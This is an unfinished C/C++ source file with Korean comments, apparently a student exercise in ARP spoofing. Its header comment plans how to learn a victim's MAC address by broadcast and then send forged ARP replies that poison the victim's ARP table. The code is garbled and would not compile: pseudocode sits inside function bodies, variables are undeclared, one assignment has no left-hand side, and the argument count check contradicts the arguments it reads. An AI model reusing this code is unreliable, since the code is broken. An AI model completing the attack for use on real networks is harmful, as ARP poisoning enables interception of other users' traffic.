/*<main 안에 들어갈 함수 > 딱 3개 
1. 피해자 mac주소 알아내기 
	- request 패킷 만들기
	-broadcast로 보내기 . broadcast 특성상 나의 ip는 없어도됨. 나의 mac 주소만 찾아내는 코드를 만들자. 
	-get_packet으로 sender의 reply 패킷 받아서 피해자 mac 주소를 변수에 저장 
2. 피해자 arp list 위조
	- 나의 mac 주소를 구했으니 
	-reply arp 페킷을 피해자에게 보냄.
	
3. 전체적으로 쓰일 패킷 만들기. 
	
	
 -request 함수(get_packet)
 -reply 함수(send_packet)
-packet make함수

	
*/
#include <ifaddrs.h>
#include <linux/if.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h> // pcap 라이브러리 헤더
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

uint32_t get_packet(char* dev, Ip ip);
uint32_t send_packet(char* dev, Ip ip);
EthArpPacket Packet_make();


//mac 가져오기 함수
Mac get_mymac(char*dev){
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    unsigned char mac[6]; // MAC 주소를 저장할 배열

    // 네트워크 인터페이스 이름 설정
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);

    // MAC 주소를 가져옵니다
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) == 0) {
        memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
        // 여기서 Mac 객체로 MAC 주소를 직접 할당합니다.
    } else {
        perror("ioctl");
        close(fd);
        return -1;
    }

    close(fd); // 소켓 사용이 끝난 후 닫습니다.

    // MAC 주소를 문자열로 변환하여 출력합니다. Mac 클래스의 생성자와 std::string 캐스팅 연산자 사용
    Mac myMac(mac);
	return myMac;
   }
char* mac_to_string(struct Mac mac) {
    char* str_mac = (char*)malloc(18 * sizeof(char)); // MAC 주소 문자열을 위한 메모리 할당 (17 + 널 종료 문자)
    if (str_mac == NULL) {
        // 메모리 할당 실패 처리
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }
    
    sprintf(str_mac, "%02X:%02X:%02X:%02X:%02X:%02X",
            mac.mac[0], mac.mac[1], mac.mac[2], mac.mac[3], mac.mac[4], mac.mac[5]);
    
    return str_mac; 
}


struct Mac myMac ={0};
EthArpPacket packet; //arp packet





EthArpPacket Packet_make (
    const std::string& dmac, 
    const std::string& smac, 
    const std::string& sip, 
    const std::string& tip,
const	std::string& arp.op_   )
{
	char* str_mac = mac_to_string(myMac);
    packet.eth_.dmac_ = Mac("00:00:00:00:00:00");
    packet.eth_.smac_ = str_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

packet.arp.op_ opcode ; // 패킷 종류 결정 변수

if(request 패킷) opcode = request
else if( reply 패킷) opcode = reply

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::opcode);
    packet.arp_.smac_ = str_mac;
    packet.arp_.sip_ = htonl(Ip("0.0.0.0"));
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(Ip("0.0.0.0"));

    return packet;

}

//sender's Mac
uint32_t get_packet(char* dev, Ip sip_ ){

    char errbuf[PCAP_ERRBUF_SIZE];

    //sender에게 받은 Mac을저장할 문자열
    Mac SenderMac = Mac::broadcastMac();

   //열어봄
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) fprintf(stderr, "pcap_open_live fail! %s(%s)\n", dev, errbuf); return 0;

    if (std::string(arpHdr->sip_) == sender_ip) {
        //pcap_close(handle);
         = Mac::broadcastMac();
        return arpHdr->smac_;
    }

}







//My Reply Packet To Sender

uint32_t send_packet(char* dev, Ip ip){
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
    pcap_close(handle);
    }


void usage() {
    printf("syntax: send-arp-test wlan0 <sender ip> <target ip> \n");
    printf("sample: send-arp-test arg[0] arg[1] arg[2]\n");
}


/*

 */
int main(int argc, char* argv[]) {
    if (argc != 2) {
        usage();
        return -1;
    }
    char* dev = argv[1]; //interface
    Ip target_ip = Ip(argv[3]);
    Ip sender_ip = Ip(argv[2]);



    Mac senderMac = get_packet(dev.c_str(), sender_ip);

    // 자신의 MAC
    Mac myMac = GetMyMacAddress(dev);

    get_packet(dev);
    send_packet();

    return 0;
}



























